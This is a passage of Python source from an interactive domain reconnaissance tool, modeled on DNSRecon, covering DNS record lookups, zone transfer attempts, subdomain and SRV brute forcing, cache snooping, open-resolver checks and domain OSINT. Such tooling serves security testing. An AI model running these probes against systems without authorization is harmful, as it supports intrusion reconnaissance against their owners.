        self.nameserver = nameserver
        self.timeout = timeout
        self.tcp = tcp
        self.resolver = None
        self._init_resolver()

    def _init_resolver(self):
        try:
            import dns.resolver
            self.resolver = dns.resolver.Resolver(configure=False)
            if self.nameserver:
                if isinstance(self.nameserver, str):
                    self.resolver.nameservers = [self.nameserver]
                else:
                    self.resolver.nameservers = self.nameserver
            self.resolver.timeout = self.timeout
            self.resolver.lifetime = self.timeout * 2
        except Exception:
            self.resolver = None

    def _resolve_q(self, qname, rdtype, raise_nx=False):
        if not self.resolver:
            return []
        try:
            import dns.rdatatype
            import dns.resolver
            answers = self.resolver.resolve(qname, rdtype, tcp=self.tcp, raise_on_no_answer=False)
            return list(answers)
        except dns.resolver.NXDOMAIN:
            if raise_nx:
                raise
            return []
        except (dns.resolver.NoAnswer, dns.resolver.Timeout):
            return []
        except Exception:
            return []

    def get_soa(self):
        import dns.rdatatype
        answers = self._resolve_q(self.domain, dns.rdatatype.SOA)
        return [{'mname': str(r.mname), 'rname': str(r.rname), 'serial': r.serial,
                 'refresh': r.refresh, 'retry': r.retry, 'expire': r.expire, 'minimum': r.minimum}
                for r in answers]

    def get_ns(self):
        import dns.rdatatype
        return [str(r) for r in self._resolve_q(self.domain, dns.rdatatype.NS)]

    def get_mx(self):
        import dns.rdatatype
        return [(r.preference, str(r.exchange)) for r in self._resolve_q(self.domain, dns.rdatatype.MX)]

    def get_a(self, hostname=None):
        import dns.rdatatype
        target = hostname or self.domain
        return [str(r) for r in self._resolve_q(target, dns.rdatatype.A)]

    def get_aaaa(self, hostname=None):
        import dns.rdatatype
        target = hostname or self.domain
        return [str(r) for r in self._resolve_q(target, dns.rdatatype.AAAA)]

    def get_txt(self, hostname=None):
        import dns.rdatatype
        target = hostname or self.domain
        result = []
        for r in self._resolve_q(target, dns.rdatatype.TXT):
            txt_string = ''.join(s.decode() if isinstance(s, bytes) else s for s in r.strings)
            result.append(txt_string)
        return result

    def get_srv(self, hostname=None):
        import dns.rdatatype
        target = hostname or self.domain
        if not target.startswith('_'):
            return []
        answers = self._resolve_q(target, dns.rdatatype.SRV)
        return [{'priority': r.priority, 'weight': r.weight, 'port': r.port, 'target': str(r.target)}
                for r in answers]

    def get_caa(self):
        import dns.rdatatype
        answers = self._resolve_q(self.domain, dns.rdatatype.CAA)
        return [{'flags': r.flags, 'tag': r.tag.decode() if isinstance(r.tag, bytes) else r.tag,
                 'value': r.value.decode() if isinstance(r.value, bytes) else r.value}
                for r in answers]

    def get_spf(self):
        return [t for t in self.get_txt() if t.startswith('v=spf1')]

    def get_cname(self, hostname):
        import dns.rdatatype
        answers = self._resolve_q(hostname, dns.rdatatype.CNAME)
        return [str(r.target) for r in answers]

    def zone_transfer(self):
        import dns.zone
        import dns.query
        ns_records = self.get_ns()
        if not ns_records:
            return {'error': 'No name servers found'}
        results = {}
        for ns in ns_records:
            try:
                axfr = dns.zone.from_xfr(dns.query.xfr(ns, self.domain, timeout=self.timeout,
                                                         lifetime=self.timeout * 2))
                if axfr:
                    records = []
                    for name, node in axfr.nodes.items():
                        for rdataset in node.rdatasets:
                            for rdata in rdataset:
                                records.append(f"{name} {rdataset.rdtype} {rdata}")
                    results[ns] = records
            except Exception as e:
                results[ns] = f"AXFR failed: {e}"
        return results

    def check_wildcard(self):
        import uuid
        import dns.resolver
        random_sub = str(uuid.uuid4())[:8] + '.' + self.domain
        try:
            self.resolver.resolve(random_sub, 'A')
            return True
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
            return False
        except Exception:
            return None

    def check_nxdomain_hijack(self):
        import uuid
        import dns.resolver
        import dns.rdatatype
        random_domain = str(uuid.uuid4())[:8] + '.nxdomain-test.local'
        try:
            answers = self.resolver.resolve(random_domain, dns.rdatatype.A)
            if answers:
                return True
            return False
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
            return False
        except Exception:
            return None

    def check_bind_version(self):
        import dns.resolver
        import dns.rdatatype
        import dns.rdataclass
        try:
            answers = self.resolver.resolve('version.bind', 'TXT', 'CH')
            return [''.join(s.decode() if isinstance(s, bytes) else s for s in r.strings) for r in answers]
        except Exception:
            return []

    def check_recursive(self):
        import dns.resolver
        import uuid
        random_domain = str(uuid.uuid4())[:8] + '.com'
        try:
            if self.resolver and self.resolver.nameservers:
                self.resolver.resolve(random_domain, 'A')
                return True
            return None
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
            return True
        except (dns.resolver.Timeout):
            return False
        except Exception:
            return None

    def check_dnssec(self):
        import dns.rdatatype
        result = {'has_dnskey': False, 'has_rrsig': False, 'has_nsec': False,
                  'has_nsec3': False, 'dnssec_signed': False, 'algorithms': []}
        dnskey = self._resolve_q(self.domain, dns.rdatatype.DNSKEY)
        if dnskey:
            result['has_dnskey'] = True
            for r in dnskey:
                result['algorithms'].append(r.algorithm)
        rrsig = self._resolve_q(self.domain, dns.rdatatype.RRSIG)
        if rrsig:
            result['has_rrsig'] = True
        result['dnssec_signed'] = result['has_dnskey'] or result['has_rrsig']
        return result

    def brute_subdomains(self, wordlist=None, threads=10, show_all=False):
        import dns.rdatatype
        import concurrent.futures
        import threading
        wordlist = wordlist or SUBDOMAIN_WORDLIST
        found = []
        lock = threading.Lock()

        def check_sub(sub):
            target = f"{sub}.{self.domain}"
            try:
                answers = self.resolver.resolve(target, dns.rdatatype.A, tcp=self.tcp,
                                                raise_on_no_answer=False)
                ips = [str(r) for r in answers]
                with lock:
                    found.append((sub, ips))
            except Exception:
                if show_all:
                    with lock:
                        found.append((sub, []))

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            list(executor.map(check_sub, wordlist))
        return found

    def brute_srv(self, services=None, threads=10):
        import dns.rdatatype
        import concurrent.futures
        import threading
        services = services or SRV_SERVICES
        found = []
        lock = threading.Lock()

        def check_srv(svc):
            target = f"{svc}.{self.domain}"
            try:
                answers = self.resolver.resolve(target, dns.rdatatype.SRV, tcp=self.tcp)
                records = [{'priority': r.priority, 'weight': r.weight, 'port': r.port,
                            'target': str(r.target)} for r in answers]
                with lock:
                    found.append((svc, records))
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            list(executor.map(check_srv, services))
        return found

    def brute_tld(self, tlds=None, threads=10):
        import dns.rdatatype
        import concurrent.futures
        import threading
        tlds = tlds or COMMON_TLDS
        base = self.domain.split('.')[0]
        found = []
        lock = threading.Lock()

        def check_tld(tld):
            target = f"{base}.{tld}"
            try:
                answers = self.resolver.resolve(target, dns.rdatatype.A, tcp=self.tcp)
                ips = [str(r) for r in answers]
                with lock:
                    found.append((target, ips))
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            list(executor.map(check_tld, tlds))
        return found

    def brute_reverse(self, ip_list, threads=10):
        import dns.reversename
        import dns.rdatatype
        import concurrent.futures
        import threading
        found = []
        lock = threading.Lock()

        def check_reverse(ip):
            try:
                rev = dns.reversename.from_address(ip)
                answers = self.resolver.resolve(rev, dns.rdatatype.PTR, tcp=self.tcp)
                ptr_names = [str(r) for r in answers]
                with lock:
                    found.append((ip, ptr_names))
            except Exception:
                pass

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            list(executor.map(check_reverse, ip_list))
        return found

    def cache_snoop(self, records_to_check, target_ns=None):
        import dns.resolver
        import dns.flags
        import dns.message
        import dns.query
        snooper = None
        if target_ns:
            snooper = dns.resolver.Resolver(configure=False)
            if isinstance(target_ns, str):
                snooper.nameservers = [target_ns]
            else:
                snooper.nameservers = target_ns
            snooper.timeout = self.timeout
            snooper.lifetime = self.timeout
        res = snooper or self.resolver
        if not res:
            return []
        found = []
        target_ns_ip = target_ns if target_ns else res.nameservers[0]
        for target, rdtype_str in records_to_check:
            try:
                msg = dns.message.make_query(target, rdtype_str, want_dnssec=False)
                msg.flags &= ~dns.flags.RD
                if snooper:
                    response = dns.query.udp(msg, target_ns, timeout=self.timeout)
                else:
                    response = dns.query.udp(msg, res.nameservers[0], timeout=self.timeout)
                if response.answer:
                    parsed_answers = []
                    for ans in response.answer:
                        parsed_answers.append(str(ans))
                    found.append((target, rdtype_str, parsed_answers))
            except Exception:
                pass
        return found

    def process_spf(self):
        spf_records = self.get_spf()
        if not spf_records:
            return []
        parsed = []
        for spf in spf_records:
            for mech in spf.split():
                if mech.startswith('ip4:'):
                    parsed.append(('ip4', mech[4:]))
                elif mech.startswith('ip6:'):
                    parsed.append(('ip6', mech[4:]))
                elif mech.startswith('include:'):
                    parsed.append(('include', mech[8:]))
                elif mech.startswith('redirect='):
                    parsed.append(('redirect', mech[9:]))
                elif mech.startswith('a'):
                    parsed.append(('a', mech))
                elif mech.startswith('mx'):
                    parsed.append(('mx', mech))
        return parsed

    def standard_enum(self, do_axfr=True):
        results = {'domain': self.domain, 'timestamp': time.time()}
        results['SOA'] = self.get_soa()
        results['NS'] = self.get_ns()
        results['MX'] = self.get_mx()
        results['A'] = self.get_a()
        results['AAAA'] = self.get_aaaa()
        results['TXT'] = self.get_txt()
        results['SPF'] = self.get_spf()
        results['SPF_PARSED'] = self.process_spf()
        results['CAA'] = self.get_caa()
        results['DNSSEC'] = self.check_dnssec()
        results['BIND_VERSION'] = self.check_bind_version()
        results['RECURSIVE'] = self.check_recursive()
        results['WILDCARD'] = self.check_wildcard()
        results['NXDOMAIN_HIJACK'] = self.check_nxdomain_hijack()
        results['NAMESERVERS'] = self.get_ns()
        if do_axfr:
            results['ZONE_TRANSFER'] = self.zone_transfer()
        return results


def dnsrecon_menu():
    clear()
    print(f"\n{R}╔══ DNSRecon-Powered DNS Enumeration Engine ══╗{Wh}")
    print(f"{R}║{Wh}  Inspired by DNSRecon - darkoperator/dnsrecon  {R}║{Wh}")
    print(f"{R}╚═══════════════════════════════════════════════╝{RS}\n")

    domain = input(f"{Wh}[{Gr}?{Wh}] {Gr}Target domain {Wh}[e.g., example.com]{Gr}: {RS}").strip().lower()
    if not domain:
        print(f"{R}[!] Domain required{RS}")
        return
    domain = domain.replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]

    ns_input = input(f"{Wh}[{Gr}?{Wh}] {C}Custom nameserver {Wh}[Enter for system default]{C}: {RS}").strip()
    nameserver = ns_input if ns_input else None

    timeout = 5
    try:
        t_in = input(f"{Wh}[{Gr}?{Wh}] {C}Timeout seconds {Wh}[default: 5]{C}: {RS}").strip()
        if t_in:
            timeout = int(t_in)
    except ValueError:
        pass

    engine = DnsReconEngine(domain, nameserver=nameserver, timeout=timeout)

    while True:
        clear()
        print(f"\n{R}╔══ DNSRecon :: {Gr}{domain}{R} ══╗{Wh}")
        print(f"{R}║{Wh}  {Gr}[1]{Wh}  Standard Enumeration (SOA/NS/MX/A/AAAA/TXT)   {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[2]{Wh}  Zone Transfer (AXFR)                            {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[3]{Wh}  Brute Force Subdomains                          {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[4]{Wh}  Brute Force SRV Records                         {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[5]{Wh}  TLD Brute Force (Domain Variants)               {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[6]{Wh}  DNSSEC & Security Checks                        {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[7]{Wh}  Wildcard Detection                              {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[8]{Wh}  BIND Version + Recursion Check                  {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[9]{Wh}  SPF Record Parser                               {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[10]{Wh} NXDOMAIN Hijacking Detection                    {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[11]{Wh} Reverse DNS Lookup (PTR)                        {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[12]{Wh} Complete Full Enumeration (All Above)           {R}║{Wh}")
        print(f"{R}║{Wh}  {Gr}[0]{Wh}  Back to Main Menu                               {R}║{Wh}")
        print(f"{R}╚═══════════════════════════════════════════════╝{RS}")

        choice = input(f"\n{Wh}[{R}?{Wh}] {R}Select{Wh}: {Gr}").strip()

        if choice == '0':
            break

        elif choice == '1':
            clear()
            print(f"\n{C}══ Standard DNS Enumeration ══{RS}\n")
            results = engine.standard_enum(do_axfr=False)
            if results.get('SOA'):
                for soa in results['SOA']:
                    print(f"  {Gr}SOA{Wh} | MNAME: {C}{soa['mname']}{Wh} RNAME: {C}{soa['rname']}{Wh}")
                    print(f"        Serial: {soa['serial']}  Refresh: {soa['refresh']}  Retry: {soa['retry']}  Expire: {soa['expire']}  Min: {soa['minimum']}")
            print()
            if results.get('NS'):
                print(f"  {Gr}NS Records{Wh}:")
                for ns in results['NS']:
                    print(f"    {C}{ns}{Wh}")
            if results.get('MX'):
                print(f"\n  {Gr}MX Records{Wh}:")
                for pref, exch in results['MX']:
                    print(f"    {C}{exch}{Wh} (priority: {pref})")
            if results.get('A'):
                print(f"\n  {Gr}A Records{Wh}:")
                for ip in results['A']:
                    print(f"    {C}{ip}{Wh}")
            if results.get('AAAA'):
                print(f"\n  {Gr}AAAA Records{Wh}:")
                for ip6 in results['AAAA']:
                    print(f"    {C}{ip6}{Wh}")
            if results.get('TXT'):
                print(f"\n  {Gr}TXT Records{Wh}:")
                for txt in results['TXT'][:10]:
                    print(f"    {C}{txt[:120]}{'...' if len(txt) > 120 else ''}{Wh}")
                if len(results['TXT']) > 10:
                    print(f"    {Y}... and {len(results['TXT']) - 10} more{Wh}")
            if results.get('SPF'):
                print(f"\n  {Gr}SPF Records{Wh}:")
                for spf in results['SPF']:
                    print(f"    {C}{spf}{Wh}")
            if results.get('CAA'):
                print(f"\n  {Gr}CAA Records{Wh}:")
                for caa in results['CAA']:
                    print(f"    {C}{caa['tag']}{Wh} = {caa['value']} (flags: {caa['flags']})")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '2':
            clear()
            print(f"\n{C}══ Zone Transfer (AXFR) ══{RS}\n")
            print(f"{Y}[*] Attempting zone transfer from all name servers...{RS}")
            axfr = engine.zone_transfer()
            if isinstance(axfr, dict):
                if 'error' in axfr:
                    print(f"  {R}{axfr['error']}{RS}")
                else:
                    for ns, records in axfr.items():
                        print(f"\n  {Gr}NS: {C}{ns}{Wh}")
                        if isinstance(records, str):
                            print(f"    {Y}{records}{Wh}")
                        elif records:
                            for r in records[:50]:
                                print(f"    {C}{r}{Wh}")
                            if len(records) > 50:
                                print(f"    {Y}... and {len(records) - 50} more{Wh}")
                        else:
                            print(f"    {Y}No records returned{Wh}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '3':
            clear()
            print(f"\n{C}══ Brute Force Subdomains ══{RS}\n")
            threads_input = input(f"{Wh}[{Gr}?{Wh}] Threads {Wh}[10]: {Gr}").strip()
            threads = int(threads_input) if threads_input.isdigit() else 10
            print(f"{Y}[*] Brute forcing ~{len(SUBDOMAIN_WORDLIST)} subdomains with {threads} threads...{RS}")
            start = time.time()
            found = engine.brute_subdomains(threads=threads)
            elapsed = time.time() - start
            if found:
                print(f"\n{Gr}[+] Found {len(found)} subdomains ({elapsed:.1f}s):{Wh}")
                for sub, ips in sorted(found, key=lambda x: x[0]):
                    print(f"  {C}{sub}.{domain}{Wh} -> {Gr}{', '.join(ips)}{Wh}")
            else:
                print(f"{Y}[-] No subdomains found{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '4':
            clear()
            print(f"\n{C}══ Brute Force SRV Records ══{RS}\n")
            threads_input = input(f"{Wh}[{Gr}?{Wh}] Threads {Wh}[10]: {Gr}").strip()
            threads = int(threads_input) if threads_input.isdigit() else 10
            print(f"{Y}[*] Checking {len(SRV_SERVICES)} SRV services...{RS}")
            found = engine.brute_srv(threads=threads)
            if found:
                print(f"\n{Gr}[+] Found {len(found)} SRV records:{Wh}")
                for svc, records in sorted(found, key=lambda x: x[0]):
                    print(f"  {C}{svc}.{domain}{Wh}")
                    for rec in records:
                        print(f"    Priority: {rec['priority']}, Weight: {rec['weight']}, Port: {rec['port']}, Target: {rec['target']}")
            else:
                print(f"{Y}[-] No SRV records found{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '5':
            clear()
            print(f"\n{C}══ TLD Brute Force (Domain Variants) ══{RS}\n")
            base = domain.split('.')[0]
            print(f"{Y}[*] Checking {base}.{{tld}} across {len(COMMON_TLDS)} TLDs...{RS}")
            found = engine.brute_tld()
            if found:
                print(f"\n{Gr}[+] Found {len(found)} registered variants:{Wh}")
                for target, ips in sorted(found, key=lambda x: x[0]):
                    print(f"  {C}{target}{Wh} -> {Gr}{', '.join(ips)}{Wh}")
            else:
                print(f"{Y}[-] No additional TLD variants found{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '6':
            clear()
            print(f"\n{C}══ DNSSEC & Security Checks ══{RS}\n")
            dnssec = engine.check_dnssec()
            print(f"  {Gr}DNSKEY Present{Wh}: {C}{dnssec['has_dnskey']}{Wh}")
            print(f"  {Gr}RRSIG Present {Wh}: {C}{dnssec['has_rrsig']}{Wh}")
            print(f"  {Gr}DNSSEC Signed{Wh}: {C}{dnssec['dnssec_signed']}{Wh}")
            if dnssec['algorithms']:
                print(f"  {Gr}Algorithms  {Wh}: {C}{dnssec['algorithms']}{Wh}")
            print(f"\n  {Gr}Wildcard    {Wh}: ", end='')
            wc = engine.check_wildcard()
            if wc is True:
                print(f"{R}Enabled (catch-all subdomain){RS}")
            elif wc is False:
                print(f"{Gr}Not detected{RS}")
            else:
                print(f"{Y}Unknown{RS}")
            print(f"  {Gr}NXDOMAIN Hijack{Wh}: ", end='')
            nx = engine.check_nxdomain_hijack()
            if nx is True:
                print(f"{R}Detected{RS}")
            elif nx is False:
                print(f"{Gr}Not detected{RS}")
            else:
                print(f"{Y}Unknown{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '7':
            clear()
            print(f"\n{C}══ Wildcard Detection ══{RS}\n")
            wc = engine.check_wildcard()
            print(f"  {Gr}Wildcard DNS{Wh}: ", end='')
            if wc is True:
                print(f"{R}ENABLED - domain responds to random subdomains{RS}")
                print(f"  {Y}[!] This will cause false positives in subdomain brute force{RS}")
            elif wc is False:
                print(f"{Gr}Not detected - NXDOMAIN for random subdomains{RS}")
            else:
                print(f"{Y}Could not determine{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '8':
            clear()
            print(f"\n{C}══ BIND Version & Recursion Check ══{RS}\n")
            bind_ver = engine.check_bind_version()
            if bind_ver:
                print(f"  {Gr}BIND Version{Wh}: {C}{', '.join(bind_ver)}{Wh}")
            else:
                print(f"  {Gr}BIND Version{Wh}: {Y}Not accessible or not BIND{RS}")
            recursive = engine.check_recursive()
            print(f"  {Gr}Open Resolver{Wh}: ", end='')
            if recursive is True:
                print(f"{R}YES - DNS recursion is enabled{RS}")
                print(f"  {Y}[!] Server can be used for DNS amplification attacks{RS}")
            elif recursive is False:
                print(f"{Gr}No - recursion disabled/restricted{RS}")
            else:
                print(f"{Y}Could not determine{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '9':
            clear()
            print(f"\n{C}══ SPF Record Parser ══{RS}\n")
            parsed = engine.process_spf()
            if parsed:
                print(f"  {Gr}SPF Mechanisms:{Wh}")
                for mech_type, value in parsed:
                    print(f"    {C}{mech_type:10}{Wh}  {value}")
                print(f"\n  {Gr}Total mechanisms: {len(parsed)}{Wh}")
            else:
                print(f"{Y}[-] No SPF records found or SPF not configured{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '10':
            clear()
            print(f"\n{C}══ NXDOMAIN Hijacking Detection ══{RS}\n")
            nx = engine.check_nxdomain_hijack()
            print(f"  {Gr}NXDOMAIN Hijacking{Wh}: ", end='')
            if nx is True:
                print(f"{R}DETECTED - NS returns IP for non-existent domains{RS}")
                print(f"  {Y}[!] DNS nameserver may be performing NXDOMAIN hijacking{RS}")
            elif nx is False:
                print(f"{Gr}Not detected - proper NXDOMAIN responses{RS}")
            else:
                print(f"{Y}Could not determine{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '11':
            clear()
            print(f"\n{C}══ Reverse DNS Lookup ══{RS}\n")
            ips_input = input(f"{Wh}[{Gr}?{Wh}] Enter IPs (comma separated): {Gr}").strip()
            if ips_input:
                ip_list = [ip.strip() for ip in ips_input.split(',') if ip.strip()]
                print(f"{Y}[*] Reverse lookup for {len(ip_list)} IPs...{RS}")
                found = engine.brute_reverse(ip_list)
                if found:
                    print()
                    for ip, ptrs in found:
                        print(f"  {C}{ip:20}{Wh} -> {Gr}{', '.join(ptrs)}{Wh}")
                else:
                    print(f"{Y}[-] No PTR records found{RS}")
            else:
                a_records = engine.get_a()
                if a_records:
                    print(f"{Y}[*] Using A records: {', '.join(a_records)}{RS}")
                    found = engine.brute_reverse(a_records)
                    if found:
                        print()
                        for ip, ptrs in found:
                            print(f"  {C}{ip:20}{Wh} -> {Gr}{', '.join(ptrs)}{Wh}")
                    else:
                        print(f"{Y}[-] No PTR records found{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        elif choice == '12':
            clear()
            print(f"\n{C}══ Complete Full Enumeration ══{RS}\n")
            print(f"{Y}[*] Running all checks...{RS}\n")
            start = time.time()

            def section(title):
                print(f"\n  {R}──[{Wh} {title} {R}]──{RS}")

            section('Standard Records')
            soa = engine.get_soa()
            if soa:
                print(f"  {Gr}SOA{Wh}: {soa[0]['mname']} / {soa[0]['rname']} (serial: {soa[0]['serial']})")
            ns = engine.get_ns()
            if ns:
                print(f"  {Gr}NS{Wh}: {', '.join(ns)}")
            mx = engine.get_mx()
            if mx:
                for p, e in mx:
                    print(f"  {Gr}MX{Wh}: {e} (priority {p})")
            a_recs = engine.get_a()
            if a_recs:
                print(f"  {Gr}A{Wh}: {', '.join(a_recs)}")
            aaaa = engine.get_aaaa()
            if aaaa:
                print(f"  {Gr}AAAA{Wh}: {', '.join(aaaa)}")
            txt = engine.get_txt()
            if txt:
                print(f"  {Gr}TXT{Wh}: {len(txt)} records")
            spf = engine.get_spf()
            if spf:
                print(f"  {Gr}SPF{Wh}: {len(spf)} record(s)")
            caa = engine.get_caa()
            if caa:
                print(f"  {Gr}CAA{Wh}: {', '.join(c['tag'] for c in caa)}")

            section('Zone Transfer')
            axfr = engine.zone_transfer()
            if isinstance(axfr, dict) and 'error' not in axfr:
                for ns_name, recs in axfr.items():
                    if isinstance(recs, list) and recs:
                        print(f"  {Gr}{ns_name}{Wh}: {len(recs)} records transferred")
                    else:
                        if isinstance(recs, str) and 'Failed' in recs:
                            print(f"  {Y}{ns_name}: AXFR rejected{Wh}")
                        else:
                            print(f"  {Y}{ns_name}: No records{Wh}")

            section('Security Checks')
            wc = engine.check_wildcard()
            print(f"  {Gr}Wildcard{Wh}: {'{R}ENABLED{RS}' if wc else '{Gr}Clean{RS}' if wc is False else '{Y}Unknown{RS}'}")
            dnssec = engine.check_dnssec()
            print(f"  {Gr}DNSSEC{Wh}: {'{Gr}Signed{RS}' if dnssec['dnssec_signed'] else '{Y}Not signed{RS}'}")
            nx_hijack = engine.check_nxdomain_hijack()
            if nx_hijack:
                print(f"  {R}NXDOMAIN Hijacking: Detected{RS}")
            bind_ver = engine.check_bind_version()
            if bind_ver:
                print(f"  {Gr}BIND Version{Wh}: {', '.join(bind_ver)}")
            recursive = engine.check_recursive()
            if recursive:
                print(f"  {R}Open Resolver: YES{RS}")

            section('SPF Parsed')
            spf_parsed = engine.process_spf()
            if spf_parsed:
                for mech_type, value in spf_parsed:
                    print(f"  {C}{mech_type:10}{Wh} {value}")

            section('Brute Force')
            print(f"{Y}[*] Brute forcing subdomains...{RS}")
            subs = engine.brute_subdomains(threads=15)
            if subs:
                print(f"  {Gr}Subdomains found: {len(subs)}{Wh}")
                for sub, ips in sorted(subs, key=lambda x: x[0])[:30]:
                    print(f"    {C}{sub}.{domain}{Wh} -> {Gr}{', '.join(ips)}{Wh}")
                if len(subs) > 30:
                    print(f"    {Y}... and {len(subs) - 30} more{Wh}")
            else:
                print(f"  {Y}No subdomains found{RS}")

            print(f"{Y}[*] Brute forcing SRV records...{RS}")
            srv_found = engine.brute_srv(threads=15)
            if srv_found:
                print(f"  {Gr}SRV records found: {len(srv_found)}{Wh}")
                for svc, recs in sorted(srv_found, key=lambda x: x[0])[:15]:
                    print(f"    {C}{svc}.{domain}{Wh}")
            else:
                print(f"  {Y}No SRV records found{RS}")

            section('Reverse Lookup')
            if a_recs:
                rev_results = engine.brute_reverse(a_recs)
                for ip, ptrs in rev_results:
                    print(f"  {C}{ip}{Wh} -> {Gr}{', '.join(ptrs)}{Wh}")

            elapsed = time.time() - start
            print(f"\n  {Gr}Enumeration complete in {elapsed:.1f} seconds{RS}")
            input(f"\n{Wh}[+{Wh}] Press Enter to continue")

        else:
            print(f"{R}[!] Invalid option{RS}")
            time.sleep(1)


def check_domain_security(domain: str) -> Dict:
    """فحص أمان النطاق"""
    security = {
        'has_ssl': False,
        'hsts': False,
        'dmarc': False,
        'spf': False,
        'dkim': False
    }
    
    try:
        import ssl
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
            s.connect((domain, 443))
            security['has_ssl'] = True
            cert = s.getpeercert()
            security['ssl_issuer'] = dict(cert.get('issuer', [])).get('organizationName', 'Unknown')
            security['ssl_expiry'] = cert.get('notAfter', 'Unknown')
    except: pass
    
    try:
        resp = requests.get(f"https://{domain}", timeout=10)
        if 'strict-transport-security' in resp.headers:
            security['hsts'] = True
    except: pass
    
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, 'TXT')
        for rdata in answers:
            txt = str(rdata)
            if 'v=spf1' in txt:
                security['spf'] = True
            if 'v=DMARC1' in txt:
                security['dmarc'] = True
    except: pass
    
    return security


def domain_osint():
    domain = input(f"\n{Wh}[?] Enter domain {Gr}[e.g., example.com]{Wh}: {Gr}").strip()
    if not domain:
        print(f"{R}[!] Domain cannot be empty!")
        input(f"\n{Wh}[+{Wh}] Press Enter to continue")
        return
    
    domain = domain.lower().replace('https://', '').replace('http://', '').split('/')[0].split('?')[0]
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R} DOMAIN OSINT INVESTIGATION (ENHANCED)")
    print(f" {Wh}{'='*50}")
    
    data = {}
    
    print(f"{Y}[*] DNS Lookup...{Wh}")
    dns_data = dns_lookup(domain)
    data["DNS"] = dns_data
    ip_addr = dns_data.get('A', 'N/A')
    print(f"{Wh} IPv4 Address   : {Gr}{ip_addr}")
    
    print(f"{Y}[*] Technology detection...{Wh}")
    tech = get_domain_technologies(domain)
    if tech.get('servers'):
        print(f"{Wh} Server         : {Gr}{', '.join(tech['servers'])}")
    if tech.get('cdn'):
        print(f"{Wh} CDN            : {Gr}{', '.join(tech['cdn'])}")
    if tech.get('frameworks'):
        print(f"{Wh} Frameworks     : {Gr}{', '.join(tech['frameworks'][:5])}")
    if tech.get('analytics'):
        print(f"{Wh} Analytics      : {Gr}{', '.join(tech['analytics'])}")
    data['Technologies'] = tech
    
    print(f"{Y}[*] Finding subdomains via CRT.sh...{Wh}")
    subdomains = get_subdomains_crt(domain)
    if subdomains:
        print(f"{Gr}[+] Found {len(subdomains)} subdomains{Wh}")
        for sub in sorted(subdomains)[:15]:
            print(f"    {C} {sub}{RS}")
        data['Subdomains'] = subdomains
    else:
        print(f"{Y}[-] No subdomains found{Wh}")
    
    print(f"{Y}[*] Security analysis...{Wh}")
    security = check_domain_security(domain)
    print(f"{Wh} SSL/TLS       : {Gr}{'Yes' if security['has_ssl'] else 'No'}")
    print(f"{Wh} HSTS          : {Gr}{'Yes' if security['hsts'] else 'No'}")
    print(f"{Wh} SPF Record    : {Gr}{'Yes' if security['spf'] else 'No'}")
    print(f"{Wh} DMARC Record  : {Gr}{'Yes' if security['dmarc'] else 'No'}")
    data['Security'] = security
    
    print(f"{Y}[*] Finding related domains...{Wh}")
    related = get_domain_related(domain)
    if related.get('similar'):
        print(f"{Wh}[*] Similar domains (typosquatting):{Wh}")
        for sim in related['similar'][:5]:
            print(f"    {C} {sim}{RS}")
        data['Related'] = related
    
    print(f"{Y}[*] Wayback Machine check...{Wh}")
    wayback_data = wayback_check(domain)
    if wayback_data.get("available"):
        print(f"{Gr}[+] Archived version found: {wayback_data.get('timestamp')}{Wh}")
        data["Wayback"] = wayback_data
    else:
        print(f"{Y}[-] No archive found{Wh}")
    
    print(f"{Y}[*] WHOIS Lookup...{Wh}")
    whois_data = whois_lookup(domain)
    if "raw" in whois_data:
        print(f"{Gr}[+] WHOIS data retrieved{Wh}")
        data["WHOIS"] = whois_data["raw"]
    
    print(f"\n {Wh}{'='*50}")
    print(f" {R} ADDITIONAL RESOURCES")
    print(f" {Wh}{'='*50}")
    print(f"{Wh} VirusTotal     : {C}https://www.virustotal.com/gui/domain/{domain}{RS}")
    print(f"{Wh} SecurityTrails : {C}https://securitytrails.com/domain/{domain}{RS}")
    print(f"{Wh} URLScan.io     : {C}https://urlscan.io/domain/{domain}{RS}")
    print(f"{Wh} Shodan         : {C}https://www.shodan.io/domain/{domain}{RS}")
    print(f"{Wh} CRT.sh         : {C}https://crt.sh/?q=%.{domain}{RS}")
    print(f"{Wh} BuiltWith      : {C}https://builtwith.com/{domain}{RS}")
    print(f"{Wh} Wappalyzer     : {C}https://www.wappalyzer.com/lookup/{domain}{RS}")
